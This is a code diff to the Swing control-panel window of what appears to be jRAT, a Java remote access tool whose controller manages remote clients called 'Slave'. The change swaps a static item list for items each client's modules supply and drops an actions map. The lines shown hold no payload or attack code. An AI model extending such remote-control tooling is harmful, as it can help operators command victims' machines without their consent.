@@ -3,7 +3,6 @@ package jrat.controller.ui.frames;
 import jrat.api.ClientEventListener;
 import jrat.api.ui.*;
 import jrat.controller.Slave;
-import jrat.controller.listeners.Performable;
 import jrat.controller.ui.components.DisabledDefaultMutableTreeNode;
 import jrat.controller.ui.renderers.ControlPanelTreeRenderer;
 
@@ -17,7 +16,9 @@ import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 import java.awt.*;
 import java.awt.event.WindowEvent;
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 @SuppressWarnings("serial")
@@ -28,12 +29,16 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
      */
     private Map<ControlPanel.Category, DefaultMutableTreeNode> categoryNodes = new HashMap<>();
 
+    /**
+     * All control panel items from modules sent to client
+     */
+    private List<ControlPanelItem> loadedItems = new ArrayList<>();
+
     private JTree tree;
 
 	public static final Map<Slave, FrameControlPanel> instances = new HashMap<>();
 
 	public HashMap<String, JPanel> panels = new HashMap<>();
-	public HashMap<String, Performable> actions = new HashMap<>();
 	private JTabbedPane tabbedPane;
 
 	private ControlPanelTreeRenderer treeRenderer;
@@ -48,6 +53,8 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
 
 	public FrameControlPanel(Slave s) {
 		super(s);
+		
+		this.loadedItems = s.getControlPanelItems();
 
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameControlPanel.class.getResource("/controlpanel.png")));
 		setTitle("Control Panel");
@@ -99,7 +106,7 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
 	public void addTabs(String currentLabel) {
         clearPanels();
 
-        for (ControlPanelItem item : ControlPanel.ITEMS) {
+        for (ControlPanelItem item : loadedItems) {
             if (item.category.text.equals(currentLabel) && item instanceof ControlPanelTab) {
                 tabbedPane.addTab(item.text, item.icon, ((ControlPanelTab) item).createPanel(slave));
             }
@@ -111,7 +118,7 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
      * @param n master tree node
      */
 	public void addNodes(DefaultMutableTreeNode n) {
-	    for (ControlPanelItem item : ControlPanel.ITEMS) {
+	    for (ControlPanelItem item : loadedItems) {
 	        DefaultMutableTreeNode parent;
 
 	        // if not category node has been created, create it and add it to the parent
@@ -136,7 +143,7 @@ public class FrameControlPanel extends BaseFrame implements TreeSelectionListene
 
             //boolean disabled = e.getPath().getLastPathComponent() instanceof DisabledDefaultMutableTreeNode;
 
-            for (ControlPanelItem item : ControlPanel.ITEMS) {
+            for (ControlPanelItem item : loadedItems) {
                 if (item.text.equals(what)) {
                     if (item instanceof ControlPanelTab) {
                         JPanel p = ((ControlPanelTab) item).createPanel(slave);
